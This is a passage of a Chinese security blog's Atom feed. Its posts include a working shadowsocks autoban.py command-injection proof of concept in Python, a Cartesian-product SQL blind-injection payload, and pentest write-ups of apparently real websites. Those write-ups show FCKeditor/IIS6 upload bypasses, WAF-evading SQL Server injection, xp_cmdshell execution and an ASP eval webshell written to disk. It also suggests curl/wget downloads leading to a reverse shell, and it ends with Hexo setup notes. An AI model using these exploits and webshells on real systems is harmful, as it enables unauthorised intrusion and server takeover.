id(8883459999)</div><div class="line">32268656L</div><div class="line">&gt;&gt;&gt; id(8883459999)</div><div class="line">32268656L</div><div class="line">&gt;&gt;&gt; id(888345999912342)</div><div class="line">32268656L</div><div class="line">&gt;&gt;&gt; id(888345999912342)</div><div class="line">32268656L</div><div class="line"># 又变了</div><div class="line">&gt;&gt;&gt; id(888345999912342234234)</div><div class="line">43317448L</div><div class="line">&gt;&gt;&gt; id(888345999912342234234)</div><div class="line">43317408L</div><div class="line">&gt;&gt;&gt; id(888345999912342234234)</div><div class="line">43317208L</div><div class="line"># 字符串不变？</div><div class="line">&gt;&gt;&gt; id(&apos;abc&apos;)</div><div class="line">41990184L</div><div class="line">&gt;&gt;&gt; id(&apos;abc&apos;)</div><div class="line">41990184L</div><div class="line"># 还是会变，凭啥abc不变？</div><div class="line">&gt;&gt;&gt; id(&apos;abcxsd&apos;)</div><div class="line">43318648L</div><div class="line">&gt;&gt;&gt; id(&apos;abcxsd&apos;)</div><div class="line">43318528L</div><div class="line">&gt;&gt;&gt; id(&apos;abcd&apos;)</div><div class="line">43318488L</div><div class="line">&gt;&gt;&gt; id(&apos;abcd&apos;)</div><div class="line">43317768L</div><div class="line">&gt;&gt;&gt; id(&apos;un&apos;)</div><div class="line">43318288L</div><div class="line">&gt;&gt;&gt; id(&apos;un&apos;) </div><div class="line">43318248L# 和字符串长度无关</div><div class="line">&gt;&gt;&gt; id(&apos;df&apos;)</div><div class="line">43318008L</div><div class="line">&gt;&gt;&gt; id(&apos;df&apos;)</div><div class="line">43318008L</div><div class="line">&gt;&gt;&gt; id(&apos;e0&apos;)</div><div class="line">43317568L</div><div class="line">&gt;&gt;&gt; id(&apos;e0&apos;)</div><div class="line">43317528L</div><div class="line">&gt;&gt;&gt; id(&apos;ae&apos;)</div><div class="line">43317208L</div><div class="line">&gt;&gt;&gt; id(&apos;ae&apos;)</div><div class="line">43318688L# 并不是因为把df识别成了十六进制数，</div></pre></td></tr></table></figure></p><p>查看官方文档对<code>id()</code>的描述，并没有找到答案。<br>下面是<strong>不负责任猜测</strong><br>貌似对于<strong>一定大小</strong>以内的数字或<strong>某些特殊</strong>字符串，一开始就会存储在某些固定地址，当给变量赋值时，就是把这个变量指向这个数或字符串。<br>其他的数字和字符串就是随用随时分配一个地址。</p><p>可参考<a href="https://blog.csdn.net/tycoon1988/article/details/38850443" target="_blank" rel="external">Python中的函数参数的传递问题</a><br><a href="https://www.zhihu.com/question/28803425/answer/285967047" target="_blank" rel="external">在 Python 中，浅拷贝和用等号引用有何使用上的区别？ - 酱油哥的回答 - 知乎</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;就随便看了2题，做个简单的记录。&lt;/p&gt;
&lt;h3&gt;&lt;span id=&quot;0x01-web-simpleweb&quot;&gt;0x01 Web-simpleweb&lt;/span&gt;&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class
      
    
    </summary>
    
      <category term="CTF" scheme="https://unothing.github.io/categories/CTF/"/>
    
    
      <category term="浅拷贝" scheme="https://unothing.github.io/tags/%E6%B5%85%E6%8B%B7%E8%B4%9D/"/>
    
  </entry>
  
  <entry>
    <title>shadowsocks远程命令执行</title>
    <link href="https://unothing.github.io/posts/ss-rat/"/>
    <id>https://unothing.github.io/posts/ss-rat/</id>
    <published>2017-11-24T13:51:36.000Z</published>
    <updated>2018-05-10T03:35:06.468Z</updated>
    
    <content type="html"><![CDATA[<p>利用条件：</p><ol><li>靶机上的<code>shadowsocks</code>是从<code>github</code>上<code>clone</code>的</li><li>靶机开启了<code>autoban.py</code>脚本</li></ol><hr><p>问题出在<code>shadowsocks-master/utils/autoban.py</code>中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python</div><div class="line"># -*- coding: utf-8 -*-</div><div class="line"></div><div class="line"># Copyright (c) 2015 clowwindy</div><div class="line">#</div><div class="line"># Permission is hereby granted, free of charge, to any person obtaining a copy</div><div class="line"># of this software and associated documentation files (the &quot;Software&quot;), to deal</div><div class="line"># in the Software without restriction, including without limitation the rights</div><div class="line"># to use, copy, modify, merge, publish, distribute, sublicense, and/or sell</div><div class="line"># copies of the Software, and to permit persons to whom the Software is</div><div class="line"># furnished to do so, subject to the following conditions:</div><div class="line">#</div><div class="line"># The above copyright notice and this permission notice shall be included in</div><div class="line"># all copies or substantial portions of the Software.</div><div class="line">#</div><div class="line"># THE SOFTWARE IS PROVIDED &quot;AS IS&quot;, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR</div><div class="line"># IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,</div><div class="line"># FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE</div><div class="line"># AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER</div><div class="line"># LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,</div><div class="line"># OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE</div><div class="line"># SOFTWARE.</div><div class="line"></div><div class="line">from __future__ import absolute_import, division, print_function, \</div><div class="line">    with_statement</div><div class="line"></div><div class="line">import os</div><div class="line">import sys</div><div class="line">import argparse</div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    parser = argparse.ArgumentParser(description=&apos;See README&apos;)</div><div class="line">    parser.add_argument(&apos;-c&apos;, &apos;--count&apos;, default=3, type=int,</div><div class="line">                        help=&apos;with how many failure times it should be &apos;</div><div class="line">                             &apos;considered as an attack&apos;)</div><div class="line">    config = parser.parse_args()</div><div class="line">    ips = &#123;&#125;</div><div class="line">    banned = set()</div><div class="line">    for line in sys.stdin:</div><div class="line">        if &apos;can not parse header when&apos; in line:</div><div class="line">            ip = line.split()[-1].split(&apos;:&apos;)[-2]</div><div class="line">            if ip not in ips:</div><div class="line">                ips[ip] = 1</div><div class="line">                print(ip)</div><div class="line">                sys.stdout.flush()</div><div class="line">            else:</div><div class="line">                ips[ip] += 1</div><div class="line">            if ip not in banned and ips[ip] &gt;= config.count:</div><div class="line">                banned.add(ip)</div><div class="line">                cmd = &apos;iptables -A INPUT -s %s -j DROP&apos; % ip</div><div class="line">                print(cmd, file=sys.stderr)</div><div class="line">                sys.stderr.flush()</div><div class="line">                os.system(cmd)</div></pre></td></tr></table></figure></p><p>从sys.stdin读取输入，然后判断是否包含<code>can not parse header when</code>字样，如果有就进行截断<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ip = line.split()[-1].split(&apos;:&apos;)[-2]</div></pre></td></tr></table></figure></p><p><code>split()</code>是采用默认空格为分隔符<br>当同一个<code>ip</code>出现的次数超过了设定的值（默认为3）,就会直接把它代入执行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">if ip not in banned and ips[ip] &gt;= config.count:</div><div class="line">                banned.add(ip)</div><div class="line">                cmd = &apos;iptables -A INPUT -s %s -j DROP&apos; % ip</div><div class="line">                print(cmd, file=sys.stderr)</div><div class="line">                sys.stderr.flush()</div><div class="line">                os.system(cmd)</div></pre></td></tr></table></figure></p><hr><p>在靶机<code>192.168.32.51</code>上<br>下载<code>github</code>上的<code>shadowsocks</code>，使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python ./shadowsocks/server.py -p 12345 -k 12345 --log-file /tmp/ss.log -d start</div></pre></td></tr></table></figure></p><p>即可开启ss的服务<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">-p端口</div><div class="line">-k口令</div><div class="line">--log-file日志文件</div><div class="line">-d start后台启动</div></pre></td></tr></table></figure></p><p>客户端可用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python ./shadowsocks/local.py -s 192.168.32.51 -p 12345 -l 8090 -k 12345</div></pre></td></tr></table></figure></p><p>登录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">-s服务器地址</div><div class="line">-p服务器端口</div><div class="line">-l本地端口</div><div class="line">-k服务器登录口令</div></pre></td></tr></table></figure></p><p>也可采用加载本地配置文件的方式启动<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python ./shadowsocks/local.py -c /etc/shadowsocks.json</div></pre></td></tr></table></figure></p><p>发现客户端对发送内容加密后才发送的。</p><p>ss服务器在接收到客户端发送过来的请求后，会对请求进行解析。关键解析函数<code>shadowsocks/common.py</code>中<code>parse_header(data)</code>函数在判断请求目标地址类型为域名后，会将其写入日志文件。</p><p>根据前面的分析，<code>payload</code>中是不能出现空格和<code>:</code>的，<code>:</code>可以避免，但是想执行命令，空格是必须的。<br>这里使用Linux中自带的IFS环境变量产生空格。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">IFS(Internal Field Seprator)，即内部域分隔符，完整定义是“The shell uses the value stored in IFS, which is the space, tab, and newline characters by default, to delimit words for the read and set commands, when parsing output from command substitution, and when performing variable substituioin.”。</div></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">IFS=$&apos; \t\n&apos;</div></pre></td></tr></table></figure><p>使用<code>||</code>和<code>${}</code>，尝试写入一个文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">can not parse header when ||echo$&#123;IFS%??&#125;&apos;hacked！&apos;&gt;testhahaha.txt:\n</div></pre></td></tr></table></figure></p><p>现在只需模拟客户端，把<code>payload</code>写到请求地址中就可以了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"># coding:utf-8</div><div class="line">import socket</div><div class="line">import sys,os</div><div class="line">sys.path.insert(0, os.path.join(os.path.dirname(__file__), &apos;../&apos;))</div><div class="line">import cryptor </div><div class="line"></div><div class="line">head = &quot;&quot;&quot;can not parse header when ||echo$&#123;IFS%??&#125;&apos;hacked！&apos;&gt;testhahaha.txt:\n&quot;&quot;&quot;</div><div class="line">target = (&quot;03%02x%s0050&quot; % (len(head), head.encode(&apos;hex&apos;))).decode(&apos;hex&apos;) # 参考socks5协议, 03表示target是域名，然后两字节域名长度，再是目的地址，最后两字节是port</div><div class="line"></div><div class="line">for i in range(3):</div><div class="line">    c = cryptor.Cryptor(&quot;12345&quot;, &quot;aes-256-cfb&quot;)</div><div class="line">    tosend = c.encrypt(target)</div><div class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">    s.connect((&apos;192.168.32.51&apos;, 12345))</div><div class="line">    s.send(tosend)</div><div class="line">    s.close()</div></pre></td></tr></table></figure></p><p>把这个py文件放入shadowsocks文件夹中运行即可。、</p><p>在服务器端执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python ./shadowsocks/utils/autoban.py &lt; /tmp/ss.log</div></pre></td></tr></table></figure></p><p>在当前文件夹下就会生成<code>testhahaha.txt</code>文档,证明命令执行成功</p><p>实际使用时，可以结合<code>curl</code>、<code>wget</code>命令从服务器下载文件，然后反弹shell。</p><hr><p>参考：<br><a href="https://paper.tuisec.win/detail/63207b0184fe59e" target="_blank" rel="external">https://paper.tuisec.win/detail/63207b0184fe59e</a><br><a href="http://foreversong.cn/archives/730" target="_blank" rel="external">http://foreversong.cn/archives/730</a><br><a href="https://x41-dsec.de/lab/advisories/x41-2017-008-shadowsocks/" target="_blank" rel="external">https://x41-dsec.de/lab/advisories/x41-2017-008-shadowsocks/</a><br><a href="https://github.com/shadowsocks/shadowsocks/tree/master" target="_blank" rel="external">https://github.com/shadowsocks/shadowsocks/tree/master</a><br><a href="https://www.cnblogs.com/happyhotty/articles/2181522.html" target="_blank" rel="external">SOCKS5协议[rfc1928]</a><br><a href="http://unixboy.iteye.com/blog/499329" target="_blank" rel="external">bash ${ } 用法总结 </a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;利用条件：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;靶机上的&lt;code&gt;shadowsocks&lt;/code&gt;是从&lt;code&gt;github&lt;/code&gt;上&lt;code&gt;clone&lt;/code&gt;的&lt;/li&gt;
&lt;li&gt;靶机开启了&lt;code&gt;autoban.py&lt;/code&gt;脚本&lt;/li&gt;
&lt;/o
      
    
    </summary>
    
    
      <category term="shadowsocks" scheme="https://unothing.github.io/tags/shadowsocks/"/>
    
  </entry>
  
  <entry>
    <title>windows日志</title>
    <link href="https://unothing.github.io/posts/win-log/"/>
    <id>https://unothing.github.io/posts/win-log/</id>
    <published>2017-11-16T12:03:00.000Z</published>
    <updated>2018-08-29T14:25:32.621Z</updated>
    
    <content type="html"><![CDATA[<p><img src="0.jpg" alt=""><br><img src="1.jpg" alt=""><br><img src="2.jpg" alt=""><br><img src="3.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;0.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;img src=&quot;1.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;img src=&quot;2.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;img src=&quot;3.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;

      
    
    </summary>
    
      <category term="溯源" scheme="https://unothing.github.io/categories/%E6%BA%AF%E6%BA%90/"/>
    
    
      <category term="log" scheme="https://unothing.github.io/tags/log/"/>
    
  </entry>
  
  <entry>
    <title>笛卡尔积延时注入</title>
    <link href="https://unothing.github.io/posts/Mysql-blind-injection/"/>
    <id>https://unothing.github.io/posts/Mysql-blind-injection/</id>
    <published>2017-11-15T02:18:33.000Z</published>
    <updated>2018-05-10T03:35:17.325Z</updated>
    
    <content type="html"><![CDATA[<p>题目过滤了各种延时函数，当时也考虑过使用某种循环查询产生类似延时的效果，奈何水平不够。看了大佬的WP学到了用笛卡尔积产生延时效果orz</p><p>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/?id=1 union select * from OPENQUERY([mysql],&apos;select if(ord(mid((select SCHEMA_NAME frOm iNfOrmAtiOn_schEma.SCHEMATA limit 3,1),1,1))=97,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B,information_schema.columns C),0)&apos;)</div></pre></td></tr></table></figure></p><p>使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT * from database.tableA,database.tableB</div></pre></td></tr></table></figure></p><p>就会对tableA,B进行笛卡尔运算。<br>例如：<br>tableA：</p><table><thead><tr><th>id</th><th>user</th></tr></thead><tbody><tr><td>1</td><td>a</td></tr><tr><td>2</td><td>b</td></tr></tbody></table><p>tableB：</p><table><thead><tr><th>uid</th><th>name</th></tr></thead><tbody><tr><td>3</td><td>c</td></tr><tr><td>4</td><td>d</td></tr></tbody></table><p>笛卡尔运算的结果：</p><table><thead><tr><th>id</th><th>user</th><th>uid</th><th>name</th></tr></thead><tbody><tr><td>1</td><td>a</td><td>3</td><td>c</td></tr><tr><td>1</td><td>a</td><td>4</td><td>d</td></tr><tr><td>2</td><td>b</td><td>3</td><td>c</td></tr><tr><td>2</td><td>b</td><td>4</td><td>d </td></tr></tbody></table><p>实际测试发现使用<code>information_schema.columns</code>不稳定，因为对于不同的数据库，<code>columns</code>的数量是不同的，太少起不了延时效果，太多可能会导致数据库崩溃。<br>使用<code>character_sets</code>（41行）和<code>collations</code>（222行）效果可能会好点，因为数据量相对计较统一。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql&gt; SELECT count(*) FROM information_schema.plugins ,information_schema.plugins A,information_schema.collations ,information_schema.collations B;</div><div class="line">+----------+</div><div class="line">| count(*) |</div><div class="line">+----------+</div><div class="line">| 95413824 |</div><div class="line">+----------+</div><div class="line">1 row in set (4.58 sec)</div></pre></td></tr></table></figure></p><p>同名表后面跟着的<code>A</code>,<code>B</code>是别名，不然选取同一个表会报错<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; SELECT * from information_schema.plugins,information_schema.plugins;</div><div class="line">ERROR 1066 (42000): Not unique table/alias: &apos;plugins&apos;</div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;题目过滤了各种延时函数，当时也考虑过使用某种循环查询产生类似延时的效果，奈何水平不够。看了大佬的WP学到了用笛卡尔积产生延时效果orz&lt;/p&gt;
&lt;p&gt;payload&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td clas
      
    
    </summary>
    
      <category term="CTF" scheme="https://unothing.github.io/categories/CTF/"/>
    
    
      <category term="blind injection" scheme="https://unothing.github.io/tags/blind-injection/"/>
    
  </entry>
  
  <entry>
    <title>超老站练手</title>
    <link href="https://unothing.github.io/posts/cep/"/>
    <id>https://unothing.github.io/posts/cep/</id>
    <published>2017-10-27T07:12:10.000Z</published>
    <updated>2018-05-10T03:35:41.805Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="0x00开始">0x00.开始</span></h3><p>链接<code>http://eaxmple.website/News/NewsList.aspx?blmid=1&amp;slmid=3</code>存在盲注漏洞。扔进Sqlmap，耗时较长，且会出错。</p><p><img src="1.png" alt=""></p><p>此处<code>UserName</code>第一个是<code>admin</code>并不是<code>gdmin</code>。幸好<code>UserPwd</code>没出错。<br><strong>密码看似是BASE64，解完是乱码，需要转换成16进制，提出字符，正好是32位，<a href="https://www.somd5.com/" target="_blank" rel="external">md5解密</a>。</strong></p><p>后台地址<code>/admin/login.aspx</code></p><h3><span id="0x01上传点">0x01.上传点</span></h3><p>Sqlmap扫描很慢，扫描同时扫描了下常用目录。发现<code>FCKeditor</code>上传点。</p><p><img src="2.png" alt=""></p><p><code>http://eaxmple.website/FCKeditor/_whatsnew.html</code>知<code>FCKeditor</code>版本</p><p><img src="3.png" alt=""></p><p>上传点有两个</p><ul><li><code>http://eaxmple.website/fckeditor/editor/filemanager/connectors/test.html</code></li><li><code>http://eaxmple.website/FCKeditor/editor/filemanager/connectors/uploadtest.html</code></li></ul><p>不可直接上传asp，可上传图片，探测知服务器是IIS6.0，有解析漏洞，可上传</p><ul><li><code>1.asp;.jpg</code></li><li><code>1.asp/1.jpg</code></li><li><code>1.asp%00.jpg</code></li></ul><p>等形式的文件绕过限制，有验证文件头的可添加<code>GIF89a</code>绕过。</p><p>但是上传后并没有返回路径，使用自带页面获取<code>current folder</code>，提示没有登录，没有返回任何xml。</p><p>使用<br><code>FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/</code><br>显示404</p><p>尝试编辑器里上传后的路径<code>/userfiles/image/</code>没有找到文件。</p><p>去找网站里图片的地址<code>/images/xxx.png</code></p><p><strong>这里由于经验少，不知道访问的文件应该是全名<code>1.asp;.jpg</code>，尝试<code>1.asp</code>并没有找到文件，还以为没有上传成功，导致放弃了该路线</strong></p><h3><span id="0x02后台getshell">0x02.后台Getshell</span></h3><p>用解密后的结果登录进后台</p><p>刚开始找到一个图片上传点，限制了文件名必须以图片的后缀名为结尾，并且会重命名：<br><code>1.asp;.jpg</code>就会变成<code>2017xxxxxxxx.jpg</code><br>而且无法添加文件夹，导致该处不能使用。</p><p>看看其他功能，找找有没有可用点。<br>找到编辑器，即<code>FCKeditor</code>。找到上传图片功能，本想着这下能找到上传后的路径。结果发现可直接浏览网站文件。</p><p><img src="4.png" alt=""></p><p>发现自己之前传的shell静静地躺在那。。。。。。</p><p><img src="5.png" alt=""></p><p>不过有意思的是传的<code>1.asp;.jpg</code>变成了<code>1_asp;.jpg</code>,但是重复上传的第二个文件<code>1.asp;(1).jpg</code>并没有变。(FCKeditor特性。。。)<br>而且第一个文件夹应该是前人的shell。。。。。。</p><p>选择文件后，得知路径，直接菜刀连接，Getshell<br><img src="6.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3&gt;&lt;span id=&quot;0x00开始&quot;&gt;0x00.开始&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;链接&lt;code&gt;http://eaxmple.website/News/NewsList.aspx?blmid=1&amp;amp;slmid=3&lt;/code&gt;存在盲注漏洞。扔进Sqlmap，耗时较长
      
    
    </summary>
    
      <category term="Pentest" scheme="https://unothing.github.io/categories/Pentest/"/>
    
    
      <category term="SQLInjection" scheme="https://unothing.github.io/tags/SQLInjection/"/>
    
      <category term="FCKeditor" scheme="https://unothing.github.io/tags/FCKeditor/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入练手站</title>
    <link href="https://unothing.github.io/posts/ya/"/>
    <id>https://unothing.github.io/posts/ya/</id>
    <published>2017-10-23T13:08:32.000Z</published>
    <updated>2018-05-10T03:34:48.863Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="0x00">0x00</span></h3><p>使用<a href="https://whatweb.net/" target="_blank" rel="external">WhatWeb</a>来获取网站的一些基本信息<br><img src="0.png" alt=""></p><p>对资源列表页面随手进行测试发现存在注入漏洞。</p><p>一般网站可能会对用户输入进行过滤，但是对于自己预置的参数值就会放松警惕，此处的<code>area</code>为影片的国家。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">list?area=%E9%A6%99%E6%B8%AF&amp;Category=</div></pre></td></tr></table></figure></p><p><img src="1.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">list?area=1&apos;</div></pre></td></tr></table></figure><p><img src="2.png" alt=""></p><p>尝试<code>order</code>出错<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">list?area=1&apos; order by 1;--</div></pre></td></tr></table></figure></p><p><strong>注：<code>--</code>后要接一个空格，或者直接使用<code>#</code>注释符，此处为sqlserver,不能使用<code>#</code></strong></p><p><img src="3.png" alt=""></p><h3><span id="0x01">0x01</span></h3><p>既然能显示错误，那么考虑使用类型转换报错来返回结果。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">list?area=1&apos; and db_name(x)&gt;0;--</div></pre></td></tr></table></figure></p><p><strong><a href="https://technet.microsoft.com/en-us/library/ms189753(v=sql.110).aspx" target="_blank" rel="external">注：<code>x</code>参数可用来选择不同数据库，为空即返回当前数据库名。</a></strong></p><p><img src="4.png" alt=""></p><p>直接猜存在<code>admin</code>表，猜到字段<code>user</code>和<code>pwd</code></p><p>但是突然发现有WAF，过滤了一些关键字。</p><p>多次测试后发现可通过URL编码转换绕过。如：<code>select</code>改变一个<code>e</code>为 URL编码<code>%65</code>，使用<code>s%65lect</code>即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">list?area=1&apos; and (s%65lect pwd from admin)&gt;0 --</div></pre></td></tr></table></figure></p><p><img src="5.png" alt=""></p><p>结果不可解。</p><h3><span id="0x02">0x02</span></h3><p>换思路</p><p>考虑命令执行</p><p>直接添加用户，提权，然后远程连接，发现没有成功。</p><p>但是，执行命令又不能直接在页面回显。</p><p>考虑把回显写到表中，然后通过读取表中的内容获得结果。</p><p>建个新表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">list?area=1&apos;;</div><div class="line">CR%65ATE TABLE fileList(line varchar(8000))--</div></pre></td></tr></table></figure></p><p>执行命令，并把结果写入到表中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">list?area=1&apos;;</div><div class="line">IN%53ERT INTO fileList </div><div class="line">  %45XEC xp_cmdshell &apos;whoami&apos;-- #</div></pre></td></tr></table></figure></p><p>直接读取只能读一行，使用<code>FOR XML</code>，可一次性获取全部内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">list?area=1&apos; and (S%65LECT * FROM fileList FOR XML AUTO)&gt;0 --</div></pre></td></tr></table></figure></p><p>发现权限不够。</p><h3><span id="0x04">0x04</span></h3><p>不能一步到位，就退而求其次，上个一句话</p><p>一开始想着写在<code>list</code>页面的同一个目录下</p><p>无奈发现，写入后，怎么都找不到。</p><p>经指点知，可能采用的是<code>SVM</code>结构的网站，最有效的写入路径应该是存储图片的文件夹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">list?area=1&apos;;</div><div class="line">IN%53ERT INTO fileList   </div><div class="line">  %45XEC xp_cmdshell &apos;echo &lt;%eval request(&quot;pass&quot;)%^&gt;^ &gt; c:\website\Movie\movie\Content\123.asp&apos;--</div></pre></td></tr></table></figure></p><p><strong>注：在cmd中使用<code>&gt;</code>会被解析为输出符号，要想使用必须要用<code>^</code>包裹</strong></p><p>菜刀连接</p><h3><span id="0x05">0x05</span></h3><p><a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="external">提权</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3&gt;&lt;span id=&quot;0x00&quot;&gt;0x00&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;使用&lt;a href=&quot;https://whatweb.net/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;WhatWeb&lt;/a&gt;来获取网站的一些基本信息&lt;br&gt;&lt;img src=&quot;
      
    
    </summary>
    
      <category term="Pentest" scheme="https://unothing.github.io/categories/Pentest/"/>
    
    
      <category term="SQLInjection" scheme="https://unothing.github.io/tags/SQLInjection/"/>
    
  </entry>
  
  <entry>
    <title>Hexo</title>
    <link href="https://unothing.github.io/posts/Hexo/"/>
    <id>https://unothing.github.io/posts/Hexo/</id>
    <published>1999-12-31T16:00:01.000Z</published>
    <updated>2018-05-30T12:37:48.542Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="0">0</span></h3><p>建议先看<a href="/2000/01/01/Git/">Git</a></p><h3><span id="1安装nodejs">1.安装NodeJs</span></h3><p><a href="https://nodejs.org/en/" target="_blank" rel="external">https://nodejs.org/en/</a></p><h3><span id="2安装hexo">2.安装hexo</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mkdir Myblog</div><div class="line">cd Myblog</div><div class="line"></div><div class="line">npm install -g hexo</div><div class="line">npm install hexo-deployer-git --save</div><div class="line">npm install hexo-generator-feed</div><div class="line">hexo init</div></pre></td></tr></table></figure><p>目录结构：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">- node_modules  依赖包</div><div class="line">- public    生成页面</div><div class="line">- scaffolds 模板</div><div class="line">- source    文章</div><div class="line">- themes    主题</div><div class="line">    - theme_name</div><div class="line">        - _config.yml  主题配置文件</div><div class="line">- _config.yml   博客配置文件</div><div class="line">- db.json   source解析所得到的</div><div class="line">- package.json  项目所需模块项目的配置信息</div></pre></td></tr></table></figure></p><h3><span 